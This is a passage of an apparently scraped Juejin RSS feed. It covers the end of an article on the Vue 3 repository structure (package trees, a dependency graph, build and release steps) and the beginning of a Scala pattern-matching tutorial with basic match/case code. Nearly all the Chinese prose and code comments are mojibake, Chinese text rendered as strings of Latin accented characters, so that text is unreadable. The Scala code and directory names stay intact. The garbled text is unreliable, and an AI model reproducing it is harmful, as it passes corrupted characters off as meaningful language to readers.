â””â”€â”€ package.json
</code></pre>
<h3 data-id="heading-7">3.5 reactivity</h3>
<p>å“åº”å¼ç³»ç»Ÿæ ¸å¿ƒï¼Œå®ç°äº† Vue 3 çš„å“åº”å¼æœºåˆ¶ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp">reactivity/
â”œâ”€â”€ __benchmarks__/     <span class="hljs-meta"># åŸºå‡†æµ‹è¯•</span>
â”œâ”€â”€ __tests__/          <span class="hljs-meta"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ effect.ts       <span class="hljs-meta"># å‰¯ä½œç”¨ç³»ç»Ÿ</span>
â”‚   â”œâ”€â”€ reactive.ts     <span class="hljs-meta"># å“åº”å¼å¯¹è±¡</span>
â”‚   â”œâ”€â”€ <span class="hljs-keyword">ref</span>.ts          <span class="hljs-meta"># å“åº”å¼å¼•ç”¨</span>
â”‚   â”œâ”€â”€ computed.ts     <span class="hljs-meta"># è®¡ç®—å±æ€§</span>
â”‚   â””â”€â”€ watch.ts        <span class="hljs-meta"># ç›‘å¬å™¨</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ package.json
</code></pre>
<h3 data-id="heading-8">3.6 reactivity-transform</h3>
<p><strong>æ³¨æ„ï¼šè¯¥åŒ…å·²è¢«ç§»é™¤</strong></p>
<p>å“åº”å¼è½¬æ¢ï¼Œæ›¾æä¾›å®éªŒæ€§çš„å“åº”å¼è¯­æ³•è½¬æ¢åŠŸèƒ½ã€‚æ ¹æ® Vue 3.4 çš„å˜æ›´æ—¥å¿—ï¼Œè¯¥åŠŸèƒ½åœ¨ Vue 3.3 ä¸­è¢«æ ‡è®°ä¸ºå¼ƒç”¨ï¼Œå¹¶åœ¨ Vue 3.4 ä¸­è¢«å®Œå…¨ç§»é™¤ã€‚</p>
<p><strong>æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>ç”¨æˆ·å¦‚æœæƒ³è¦ç»§ç»­ä½¿ç”¨å“åº”å¼è½¬æ¢åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fvue-macros.dev%2Ffeatures%2Freactivity-transform.html" target="_blank" title="https://vue-macros.dev/features/reactivity-transform.html" ref="nofollow noopener noreferrer">Vue Macros æ’ä»¶</a> æ¥å®ç°ã€‚</li>
<li>å®˜æ–¹æ¨èä½¿ç”¨æ ‡å‡†çš„ <code>ref()</code>ã€<code>reactive()</code> å’Œ <code>computed()</code> API æ›¿ä»£ã€‚</li>
</ul>
<h3 data-id="heading-9">3.7 runtime-core</h3>
<p>æ ¸å¿ƒè¿è¡Œæ—¶ï¼Œæä¾›ä¸å¹³å°æ— å…³çš„è¿è¡Œæ—¶åŠŸèƒ½ï¼Œæ˜¯Vue 3è·¨å¹³å°èƒ½åŠ›çš„åŸºç¡€ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">runtime-core/
â”œâ”€â”€ __tests__/          <span class="hljs-comment"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ component.ts    <span class="hljs-comment"># ç»„ä»¶ç³»ç»Ÿ</span>
â”‚   â”œâ”€â”€ renderer.ts     <span class="hljs-comment"># æ¸²æŸ“å™¨</span>
â”‚   â”œâ”€â”€ vnode.ts        <span class="hljs-comment"># è™šæ‹ŸèŠ‚ç‚¹</span>
â”‚   â”œâ”€â”€ scheduler.ts    <span class="hljs-comment"># è°ƒåº¦å™¨</span>
â”‚   â””â”€â”€ h.ts            <span class="hljs-comment"># åˆ›å»ºè™šæ‹ŸèŠ‚ç‚¹çš„å‡½æ•°</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ package.json
</code></pre>
<p><strong>è¯¦ç»†è§£ææ•¬è¯·å…³æ³¨</strong></p>
<h3 data-id="heading-10">3.8 runtime-dom</h3>
<p>DOM è¿è¡Œæ—¶ï¼ŒåŸºäº runtime-core æ‰©å±•ï¼Œæä¾› DOM ç‰¹å®šçš„è¿è¡Œæ—¶åŠŸèƒ½ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">runtime-dom/
â”œâ”€â”€ __tests__/          <span class="hljs-comment"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ components/     <span class="hljs-comment"># DOM ç‰¹å®šç»„ä»¶</span>
â”‚   â”œâ”€â”€ directives/     <span class="hljs-comment"># DOM ç‰¹å®šæŒ‡ä»¤</span>
â”‚   â”œâ”€â”€ modules/        <span class="hljs-comment"># DOM æ¨¡å—</span>
â”‚   â”œâ”€â”€ nodeOps.ts      <span class="hljs-comment"># DOM èŠ‚ç‚¹æ“ä½œ</span>
â”‚   â””â”€â”€ patchProp.ts    <span class="hljs-comment"># å±æ€§è¡¥ä¸</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ package.json
</code></pre>
<h3 data-id="heading-11">3.9 runtime-test</h3>
<p>æµ‹è¯•è¿è¡Œæ—¶ï¼Œç”¨äºæµ‹è¯• Vue ç»„ä»¶å’ŒåŠŸèƒ½ã€‚</p>
<h3 data-id="heading-12">3.10 server-renderer</h3>
<p>æœåŠ¡å™¨æ¸²æŸ“å™¨ï¼Œç”¨äºå°† Vue ç»„ä»¶æ¸²æŸ“ä¸º HTML å­—ç¬¦ä¸²ã€‚</p>
<h3 data-id="heading-13">3.11 shared</h3>
<p>å…±äº«å·¥å…·å‡½æ•°ï¼Œä¾›å…¶ä»–åŒ…ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-14">3.12 vue</h3>
<p>ä¸»åŒ…ï¼Œæ•´åˆäº†æ ¸å¿ƒåŠŸèƒ½ï¼Œæä¾›å®Œæ•´çš„ Vue 3 APIã€‚</p>
<pre><code class="hljs language-bash" lang="bash">vue/
â”œâ”€â”€ __tests__/          <span class="hljs-comment"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ index.ts        <span class="hljs-comment"># å…¥å£æ–‡ä»¶</span>
â”‚   â””â”€â”€ runtime.ts      <span class="hljs-comment"># è¿è¡Œæ—¶å…¥å£</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ package.json
</code></pre>
<h3 data-id="heading-15">3.13 vue-compat</h3>
<p>Vue 2 å…¼å®¹æ€§åŒ…ï¼Œå¸®åŠ©ä» Vue 2 è¿ç§»åˆ° Vue 3ã€‚</p>
<h2 data-id="heading-16">4. ç§æœ‰åŒ…ç»“æ„ (packages-private/)</h2>
<p>ç§æœ‰åŒ…ä¸»è¦ç”¨äºæµ‹è¯•ã€å¼€å‘å·¥å…·å’Œå†…éƒ¨ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp">packages-<span class="hljs-keyword">private</span>/
â”œâ”€â”€ dts-built-test/     <span class="hljs-meta"># ç±»å‹å®šä¹‰æ„å»ºæµ‹è¯•</span>
â”œâ”€â”€ dts-test/           <span class="hljs-meta"># ç±»å‹å®šä¹‰æµ‹è¯•</span>
â”œâ”€â”€ sfc-playground/     <span class="hljs-meta"># SFC  playground</span>
â”œâ”€â”€ template-explorer/  <span class="hljs-meta"># æ¨¡æ¿æµè§ˆå™¨</span>
â”œâ”€â”€ vite-debug/         <span class="hljs-meta"># Vite è°ƒè¯•</span>
â”œâ”€â”€ <span class="hljs-keyword">global</span>.d.ts         <span class="hljs-meta"># å…¨å±€ç±»å‹å®šä¹‰</span>
â””â”€â”€ tsconfig.json       <span class="hljs-meta"># TypeScript é…ç½®</span>
</code></pre>
<h2 data-id="heading-17">5. è„šæœ¬ç›®å½• (scripts/)</h2>
<p>åŒ…å«é¡¹ç›®çš„æ„å»ºã€å¼€å‘å’Œå‘å¸ƒè„šæœ¬ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">scripts/
â”œâ”€â”€ aliases.js          <span class="hljs-comment"># åˆ«åé…ç½®</span>
â”œâ”€â”€ build.js            <span class="hljs-comment"># æ„å»ºè„šæœ¬</span>
â”œâ”€â”€ dev.js              <span class="hljs-comment"># å¼€å‘è„šæœ¬</span>
â”œâ”€â”€ inline-enums.js     <span class="hljs-comment"># æšä¸¾å†…è”è„šæœ¬</span>
â”œâ”€â”€ pre-dev-sfc.js      <span class="hljs-comment"># SFC å¼€å‘å‰ç½®è„šæœ¬</span>
â”œâ”€â”€ release.js          <span class="hljs-comment"># å‘å¸ƒè„šæœ¬</span>
â”œâ”€â”€ setup-vitest.ts     <span class="hljs-comment"># Vitest é…ç½®</span>
â”œâ”€â”€ size-report.js      <span class="hljs-comment"># å¤§å°æŠ¥å‘Šè„šæœ¬</span>
â”œâ”€â”€ usage-size.js       <span class="hljs-comment"># ä½¿ç”¨å¤§å°è„šæœ¬</span>
â”œâ”€â”€ utils.js            <span class="hljs-comment"># å·¥å…·å‡½æ•°</span>
â”œâ”€â”€ verify-commit.js    <span class="hljs-comment"># æäº¤éªŒè¯è„šæœ¬</span>
â””â”€â”€ verify-treeshaking.js <span class="hljs-comment"># æ ‘æ‘‡éªŒè¯è„šæœ¬</span>
</code></pre>
<h2 data-id="heading-18">6. åŒ…ä¹‹é—´çš„ä¾èµ–å…³ç³»</h2>
<p>Vue 3 çš„åŒ…ä¹‹é—´å­˜åœ¨æ¸…æ™°çš„ä¾èµ–å…³ç³»ï¼Œä»¥ä¸‹æ˜¯è¯¦ç»†çš„ä¾èµ–å…³ç³»å›¾ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">vue
â”œâ”€â”€ compiler-sfc
â”‚   â”œâ”€â”€ compiler-core
â”‚   â””â”€â”€ compiler-dom
â”œâ”€â”€ runtime-dom
â”‚   â”œâ”€â”€ runtime-core
â”‚   â”‚   â”œâ”€â”€ reactivity
â”‚   â”‚   â””â”€â”€ <span class="hljs-keyword">shared</span>
â”‚   â””â”€â”€ <span class="hljs-keyword">shared</span>
â””â”€â”€ server-renderer
    â”œâ”€â”€ compiler-ssr
    â”‚   â”œâ”€â”€ compiler-core
    â”‚   â””â”€â”€ compiler-dom
    â””â”€â”€ runtime-core
</code></pre>
<h3 data-id="heading-19">è¯¦ç»†ä¾èµ–å…³ç³»å›¾</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    subgraph åŸºç¡€ä¾èµ–
        shared
    end

    subgraph ç¼–è¯‘å™¨
        compiler-core --&gt; shared
        compiler-dom --&gt; compiler-core
        compiler-dom --&gt; shared
        compiler-ssr --&gt; compiler-core
        compiler-ssr --&gt; shared
        compiler-sfc --&gt; compiler-core
        compiler-sfc --&gt; compiler-dom
        compiler-sfc --&gt; compiler-ssr
        compiler-sfc --&gt; shared
    end

    subgraph å“åº”å¼ç³»ç»Ÿ
        reactivity --&gt; shared
        %% reactivity-transform --&gt; reactivity (å·²ç§»é™¤)
    end

    subgraph è¿è¡Œæ—¶
        runtime-core --&gt; shared
        runtime-core --&gt; reactivity
        runtime-dom --&gt; runtime-core
        runtime-dom --&gt; shared
        server-renderer --&gt; runtime-core
        server-renderer --&gt; compiler-ssr
        server-renderer --&gt; shared
        runtime-test --&gt; runtime-core
        runtime-test --&gt; shared
    end

    subgraph ä¸»åŒ…
        vue --&gt; compiler-sfc
        vue --&gt; runtime-dom
        vue --&gt; server-renderer
        vue --&gt; shared
        vue-compat --&gt; vue
        vue-compat --&gt; shared
    end
</code></pre>
<h3 data-id="heading-20">ä¾èµ–å…³ç³»è¯´æ˜</h3>
<ol>
<li>
<p><strong>å…±äº«ä¾èµ–</strong>ï¼š</p>
<ul>
<li><code>shared</code> åŒ…è¢«æ‰€æœ‰å…¶ä»–åŒ…ä¾èµ–ï¼Œæä¾›å…±äº«çš„å·¥å…·å‡½æ•°</li>
</ul>
</li>
<li>
<p><strong>ç¼–è¯‘å™¨é“¾</strong>ï¼š</p>
<ul>
<li><code>compiler-core</code> æ˜¯æ‰€æœ‰ç¼–è¯‘å™¨çš„åŸºç¡€</li>
<li><code>compiler-dom</code> å’Œ <code>compiler-ssr</code> åˆ†åˆ«æ‰©å±• <code>compiler-core</code> ä»¥æ”¯æŒ DOM å’Œ SSR ç¯å¢ƒ</li>
<li><code>compiler-sfc</code> ä¾èµ– <code>compiler-core</code> å’Œ <code>compiler-dom</code> æ¥ç¼–è¯‘å•æ–‡ä»¶ç»„ä»¶</li>
</ul>
</li>
<li>
<p><strong>å“åº”å¼ç³»ç»Ÿ</strong>ï¼š</p>
<ul>
<li><code>reactivity</code> æ˜¯å“åº”å¼ç³»ç»Ÿçš„æ ¸å¿ƒ</li>
</ul>
</li>
<li>
<p><strong>è¿è¡Œæ—¶é“¾</strong>ï¼š</p>
<ul>
<li><code>runtime-core</code> æä¾›ä¸å¹³å°æ— å…³çš„è¿è¡Œæ—¶åŠŸèƒ½</li>
<li><code>runtime-dom</code> æ‰©å±• <code>runtime-core</code> ä»¥æ”¯æŒ DOM ç¯å¢ƒ</li>
<li><code>server-renderer</code> ç”¨äºæœåŠ¡å™¨ç«¯æ¸²æŸ“</li>
</ul>
</li>
<li>
<p><strong>ä¸»åŒ…</strong>ï¼š</p>
<ul>
<li><code>vue</code> ä¸»åŒ…æ•´åˆäº†æ‰€æœ‰æ ¸å¿ƒåŠŸèƒ½</li>
<li><code>vue-compat</code> æä¾› Vue 2 å…¼å®¹æ€§æ”¯æŒ</li>
</ul>
</li>
</ol>
<p>è¿™ç§æ¨¡å—åŒ–çš„ä¾èµ–è®¾è®¡ä½¿å¾— Vue 3 å…·æœ‰å¾ˆå¥½çš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®éœ€è¦åªå¼•å…¥å¿…è¦çš„åŒ…ã€‚</p>
<h2 data-id="heading-21">7. æ„å»ºæµç¨‹</h2>
<ol>
<li>ä½¿ç”¨ <code>scripts/build.js</code> è„šæœ¬æ„å»ºé¡¹ç›®</li>
<li>æ”¯æŒå¤šç§æ„å»ºæ ¼å¼ï¼šES modulesã€CommonJSã€UMD</li>
<li>æ”¯æŒå¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒæ„å»º</li>
<li>æ”¯æŒæŒ‰éœ€æ„å»ºç‰¹å®šåŒ…</li>
</ol>
<h2 data-id="heading-22">8. å¼€å‘æµç¨‹</h2>
<ol>
<li>ä½¿ç”¨ <code>scripts/dev.js</code> è„šæœ¬å¯åŠ¨å¼€å‘æœåŠ¡å™¨</li>
<li>æ”¯æŒçƒ­æ¨¡å—æ›¿æ¢</li>
<li>æä¾› SFC playground ç”¨äºå®æ—¶ç¼–è¾‘å’Œé¢„è§ˆç»„ä»¶</li>
</ol>
<h2 data-id="heading-23">9. æµ‹è¯•ä½“ç³»</h2>
<ol>
<li>ä½¿ç”¨ Vitest è¿›è¡Œå•å…ƒæµ‹è¯•å’ŒåŸºå‡†æµ‹è¯•</li>
<li>æä¾›å®Œæ•´çš„ E2E æµ‹è¯•</li>
<li>æ”¯æŒç±»å‹å®šä¹‰æµ‹è¯•</li>
<li>æ”¯æŒä»£ç è¦†ç›–ç‡æŠ¥å‘Š</li>
</ol>
<h2 data-id="heading-24">10. å‘å¸ƒæµç¨‹</h2>
<ol>
<li>ä½¿ç”¨ <code>scripts/release.js</code> è„šæœ¬å‘å¸ƒç‰ˆæœ¬</li>
<li>è‡ªåŠ¨ç”Ÿæˆå˜æ›´æ—¥å¿—</li>
<li>æ”¯æŒè¯­ä¹‰åŒ–ç‰ˆæœ¬æ§åˆ¶</li>
<li>è‡ªåŠ¨å‘å¸ƒåˆ° npm</li>
</ol>
<h2 data-id="heading-25">11. æ€»ç»“</h2>
<p>Vue 3 é‡‡ç”¨äº†æ¨¡å—åŒ–çš„æ¶æ„è®¾è®¡ï¼Œå°†æ ¸å¿ƒåŠŸèƒ½æ‹†åˆ†ä¸ºå¤šä¸ªç‹¬ç«‹çš„åŒ…ï¼Œä»¥å®ç°æ›´å¥½çš„ä»£ç ç»„ç»‡ã€å¯ç»´æŠ¤æ€§å’ŒæŒ‰éœ€å¼•å…¥ã€‚è¿™ç§è®¾è®¡ä½¿å¾— Vue 3 æ›´åŠ çµæ´»ã€é«˜æ•ˆï¼Œå¹¶ä¸”æ˜“äºæ‰©å±•å’Œå®šåˆ¶ã€‚</p>
<p>é€šè¿‡äº†è§£ Vue 3 çš„é¡¹ç›®ç»“æ„ï¼Œå¼€å‘è€…å¯ä»¥æ›´å¥½åœ°ç†è§£æ¡†æ¶çš„å†…éƒ¨å·¥ä½œåŸç†ï¼Œä»è€Œæ›´æœ‰æ•ˆåœ°ä½¿ç”¨å’Œæ‰©å±• Vue 3ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¨¡å¼åŒ¹é…-åŸºç¡€ä½¿ç”¨]]></title>    <link>https://juejin.cn/post/7583933107690717247</link>    <guid>https://juejin.cn/post/7583933107690717247</guid>    <pubDate>2025-12-16T03:37:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583933107690717247" data-draft-id="7583980250733592639" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¨¡å¼åŒ¹é…-åŸºç¡€ä½¿ç”¨"/> <meta itemprop="keywords" content="Scala"/> <meta itemprop="datePublished" content="2025-12-16T03:37:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å†»æ¢¨"/> <meta itemprop="url" content="https://juejin.cn/user/3009826775398218"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¨¡å¼åŒ¹é…-åŸºç¡€ä½¿ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3009826775398218/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å†»æ¢¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:37:41.000Z" title="Tue Dec 16 2025 03:37:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å†…å®¹ï¼š</strong></p>
<p>1.Scala ä¸­çš„æ¨¡å¼åŒ¹é…</p>
<h4 data-id="heading-0">ï¼ˆä¸€ï¼‰é—®é¢˜å¯¼å…¥</h4>
<p>æˆ‘ä»¬ä»Šå¤©æ¥åˆ°ä¸€ä¸ªå¼€å‘ä»»åŠ¡ï¼Œå°±æ˜¯æ ¹æ®èº«ä»½è¯å·ç ï¼Œè¾“å‡ºè¿™ä¸ªäººçš„ç±è´¯ã€‚ä¾‹å¦‚ï¼š42è¡¨ç¤ºæ¹–åŒ—ï¼Œ33è¡¨ç¤ºæµ™æ±Ÿï¼Œ11è¡¨ç¤ºåŒ—äº¬ï¼Œ31è¡¨ç¤ºä¸Šæµ·ã€‚</p>
<h4 data-id="heading-1">ï¼ˆäºŒï¼‰å…·ä½“ä»£ç </h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> matchcase

<span class="hljs-comment">/**
   match case

   ä¸‰å¤§ç»“æ„
     1. é¡ºåºç»“æ„
     2. é€‰æ‹©ç»“æ„
        (1) if, if else if else;
        (2) match case
               case_ ä¸èƒ½çœç•¥ï¼Œå¦åˆ™ï¼ŒåŒ¹é…å¤±è´¥ä¼šæŠ¥é”™
               case_ å¿…éœ€å†™åœ¨æœ€å
     3. å¾ªç¯ç»“æ„:
        (1) for
        (2) while, do...while
* */</span>

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">case01</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
<span class="hljs-comment">//    val code = "11"</span>
<span class="hljs-comment">//    var province = ""</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//    if(code == "42"){</span>
<span class="hljs-comment">//      province = "æ¹–åŒ—"</span>
<span class="hljs-comment">//    } else if(code == "11") {</span>
<span class="hljs-comment">//      province = "åŒ—äº¬"</span>
<span class="hljs-comment">//    } else  {</span>
<span class="hljs-comment">//      province = "æœªçŸ¥"</span>
<span class="hljs-comment">//    }</span>

    <span class="hljs-keyword">val</span> code = <span class="hljs-string">"11"</span>
    <span class="hljs-keyword">val</span> province = code <span class="hljs-keyword">match</span> {
      <span class="hljs-keyword">case</span> <span class="hljs-string">"42"</span> =&gt; <span class="hljs-string">"æ¹–åŒ—"</span>
      <span class="hljs-keyword">case</span> <span class="hljs-string">"11"</span> =&gt; <span class="hljs-string">"åŒ—äº¬"</span>
      <span class="hljs-keyword">case</span> _ =&gt; <span class="hljs-string">"æœªçŸ¥"</span>
    }

    println(<span class="hljs-string">s"<span class="hljs-subst">${code}</span> å¯¹åº”çš„çœä»½æ˜¯ï¼š<span class="hljs-subst">${province}</span>"</span>)
  }
}
</code></pre>
<p>ã€è¿è¡Œç»“æœã€‘
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5ad29aa0a7d48968fd342882b72f390~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5Ya75qKo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461061&amp;x-signature=PRH%2BckV%2BU1Yj%2BWW74sCwUw6LGQc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-2">(ä¸‰)match caseçš„åŸºæœ¬æ ¼å¼</h4>
<p>æ ¼å¼å¦‚ä¸‹:</p>
<pre><code class="hljs language-scala" lang="scala">value <span class="hljs-keyword">match</span> {

Â Â <span class="hljs-keyword">case</span> pattern1 =&gt; result1

Â Â <span class="hljs-keyword">case</span> pattern2 =&gt; result2

...

Â Â <span class="hljs-keyword">case</span> patternN =&gt; resultN

<span class="hljs-keyword">case</span> _ =&gt; å…¶ä»–

}
</code></pre>
<p>æ‰§è¡Œæµç¨‹æ˜¯ï¼šå¦‚æœvalueåŒ¹é…åˆ°äº†pattern1ï¼Œå°±æ‰§è¡Œç»“æœ1ï¼Œå¦‚æœéƒ½æ²¡æœ‰åŒ¹é…åˆ°ï¼Œå°±æ‰§è¡Œ _ å¯¹åº”çš„å†…å®¹ã€‚</p>
<p>é€šè¿‡<strong>ä¾‹å­</strong>æ¥å·©å›ºä¸‹:</p>
<p>è¾“å…¥ä¸€ä¸ª1~5çš„æ•°å­—ï¼Œæ‰“å°å®ƒå¯¹åº”çš„è‹±è¯­å•è¯</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> matchcase

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">case02</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-comment">// è¾“å…¥ä¸€ä¸ª1~5çš„æ•°å­—ï¼Œæ‰“å°å®ƒå¯¹åº”çš„è‹±è¯­å•è¯</span>
    <span class="hljs-keyword">val</span> num = <span class="hljs-number">2</span>
    <span class="hljs-keyword">val</span> word = num <span class="hljs-keyword">match</span> {
      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span> =&gt; <span class="hljs-string">"One"</span>
      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span> =&gt; <span class="hljs-string">"Two"</span>
